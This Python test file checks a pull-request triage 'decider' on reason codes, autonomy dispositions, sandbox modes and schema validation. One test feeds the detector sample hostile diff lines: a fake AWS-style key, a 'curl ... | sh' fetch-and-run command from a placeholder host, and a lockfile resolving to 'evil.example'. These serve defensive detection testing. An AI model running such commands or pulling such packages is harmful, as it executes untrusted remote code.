"""Policy v1 behaviour, pinned to the fixtures shared with the Rust decider."""
import json
from pathlib import Path

import pytest

from sandboxes import decider

CASES = json.loads((Path(__file__).parent / "decider_cases.json").read_text(encoding="utf-8"))


@pytest.mark.parametrize("case", CASES["cases"], ids=lambda c: c["name"])
def test_shared_fixture_cases(case):
    got = decider.decide(case["facts"], case["conf_floor"])
    assert got.pop("latency_ms") >= 0
    assert got == case["expect"]


def test_every_decision_matches_the_shared_schema():
    for case in CASES["cases"]:
        got = decider.decide(case["facts"], case["conf_floor"])
        assert decider.validate_decision(got)["policy_version"] == "v1"
        assert 0.0 <= got["confidence"] <= 1.0
        assert got["reason_code"] in decider.REASON_CODES


def test_all_seven_reason_codes_are_reachable():
    seen = {decider.decide(c["facts"], c["conf_floor"])["reason_code"] for c in CASES["cases"]}
    assert seen == set(decider.REASON_CODES)


def test_skip_is_never_reached_through_scoring():
    for case in CASES["cases"]:
        got = decider.decide(case["facts"], case["conf_floor"])
        if got["decision"] == decider.SKIP:
            assert got["reason_code"] in ("DOCS_ONLY", "LOCKFILE_BUMP")


def test_extract_facts_flags_secrets_shell_pipes_and_untrusted_lock_urls():
    files = [
        {"filename": "a.py", "additions": 1, "patch": "@@\n+key = 'AKIAABCDEFGHIJKLMNOP'\n"},
        {"filename": "i.sh", "additions": 1, "patch": "@@\n+curl -fsSL https://x.example/i | sh\n"},
        {"filename": "package-lock.json", "additions": 1,
         "patch": '@@\n+"resolved": "https://evil.example/pkg.tgz"\n'},
        {"filename": "yarn.lock", "additions": 1,
         "patch": '@@\n+resolved "https://registry.yarnpkg.com/x/-/x-1.tgz"\n'},
        {"filename": "big.lock", "additions": 9000},  # GitHub omits patches for huge files
    ]
    facts = decider.extract_facts("t", files)
    by_path = {f["path"]: set(f["flags"]) for f in facts["files"]}
    assert "secret_like" in by_path["a.py"]
    assert "shell_pipe" in by_path["i.sh"]
    assert "untrusted_url" in by_path["package-lock.json"]
    assert by_path["yarn.lock"] == set()
    assert "no_patch" in by_path["big.lock"]
    assert all("patch" not in f for f in facts["files"])  # facts never carry raw patches


def test_removed_lines_do_not_trigger_secret_flags():
    facts = decider.extract_facts("t", [{"filename": "a.py", "patch": "@@\n-key = 'AKIAABCDEFGHIJKLMNOP'\n"}])
    assert facts["files"][0]["flags"] == []


def test_disposition_by_autonomy_level():
    skip = {"decision": "SKIP", "confidence": 0.97}
    fast_hi = {"decision": "FAST_REVIEW", "confidence": 0.84}
    fast_lo = {"decision": "FAST_REVIEW", "confidence": 0.62}
    sandbox = {"decision": "SANDBOX_TEST", "confidence": 0.9}
    esc = {"decision": "ESCALATE_HUMAN", "confidence": 0.95}
    d = decider.disposition
    assert [d(x, "assist", 0.75, 0.55) for x in (skip, fast_hi, fast_lo, sandbox, esc)] == \
        ["auto", "auto", "ask", "ask", "ask"]
    assert [d(x, "auto", 0.75, 0.55) for x in (skip, fast_hi, fast_lo, sandbox, esc)] == \
        ["auto", "auto", "auto", "auto", "ask"]


def test_effective_mode_never_exceeds_the_agents_configured_mode():
    sandbox_box = {"decision": "SANDBOX_TEST", "provider": "box"}
    sandbox_vercel = {"decision": "SANDBOX_TEST", "provider": "vercel"}
    fast = {"decision": "FAST_REVIEW", "provider": "review"}
    assert decider.effective_mode("review_only", sandbox_box) == "review_only"
    assert decider.effective_mode("interactive", fast) == "review_only"
    assert decider.effective_mode("ephemeral", sandbox_box) == "interactive"
    assert decider.effective_mode("interactive", sandbox_vercel) == "ephemeral"
    assert decider.effective_mode("interactive", {"decision": "SKIP", "provider": "none"}) is None
    assert decider.effective_mode("interactive", {"decision": "ESCALATE_HUMAN", "provider": "none"}) is None


@pytest.mark.parametrize("mutate", [
    lambda d: d.pop("latency_ms"),
    lambda d: d.update(extra=1),
    lambda d: d.update(decision="MERGE"),
    lambda d: d.update(provider="aws"),
    lambda d: d.update(reason_code="WHY_NOT"),
    lambda d: d.update(confidence=1.5),
    lambda d: d.update(confidence=True),
    lambda d: d.update(latency_ms=-1),
    lambda d: d.update(provider="box"),  # FAST_REVIEW must use "review"
])
def test_validate_decision_rejects_malformed_input(mutate):
    good = {"decision": "FAST_REVIEW", "confidence": 0.9, "provider": "review",
            "reason_code": "STATIC_DIFF_OK", "policy_version": "v1", "latency_ms": 3}
    assert decider.validate_decision(dict(good))
    bad = dict(good)
    mutate(bad)
    with pytest.raises(ValueError):
        decider.validate_decision(bad)
